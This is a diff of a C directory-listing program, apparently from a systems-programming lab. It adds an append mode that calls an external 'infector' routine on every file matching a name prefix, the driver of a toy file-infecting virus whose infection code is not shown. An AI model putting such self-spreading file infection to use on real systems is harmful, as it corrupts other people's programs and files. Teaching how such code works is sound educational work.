@@ -18,9 +18,14 @@
 #define ERR_CODE 0x55
 
 extern int system_call();
+extern void code_start();
+extern void infection(int);
+extern void infector(char *);
+extern void code_end();
 
 int DEBUG = 0;
 int PREFIX = 0;
+int APPEND = 0;
 
 struct linux_dirent
 {
@@ -36,6 +41,7 @@ void print(char *str);
 
 int main(int argc, char *argv[], char *envp[])
 {
+    
     char *prefix;
     int i;
     for (i = 1; i < argc; i++)
@@ -56,12 +62,15 @@ int main(int argc, char *argv[], char *envp[])
 
             if (argv[i][1] == 'a')
             {
+                APPEND = 1;
             }
         }
     }
     print("Flame 2 strikes!\n");
     int fd = system_call(OPEN, ".", O_RDONLY, 0777);
-    debug("syscall: 05 returned: ");
+    debug("system call [arg1, arg2, arg3, arg4, ret code] = 5 '.' ");
+    debug(itoa(O_RDONLY));
+    debug(" 0777 ");
     debug(itoa(fd));
     debug("\n");
 
@@ -98,6 +107,14 @@ int main(int argc, char *argv[], char *envp[])
                         print(dir->d_name);
                         print("\n");
                         printDirType(dirType);
+                    }
+                }
+                else if (APPEND)
+                {
+
+                    if (strlen(prefix) <= strlen(dir->d_name) && (strncmp(dir->d_name, prefix, strlen(prefix)) == 0))
+                    {
+                        infector(dir->d_name);
                     }
                 }
                 else
@@ -172,7 +189,13 @@ void debug(char *er)
 void print(char *str)
 {
     int write = system_call(SYS_WRITE, STDOUT, str, strlen(str));
-    debug("syscall: 04 returned: ");
-    debug(itoa(write));
+    debug("\nsystem call [arg1, arg2, arg3, arg4, ret code] = 4 ");
+    debug(itoa(SYS_WRITE));
+    debug(" ");
+    debug(itoa(STDOUT));
+    debug(" ");
+    debug(str);
+    debug(" ");
+    debug(itoa(strlen(str)));
     debug("\n");
 }
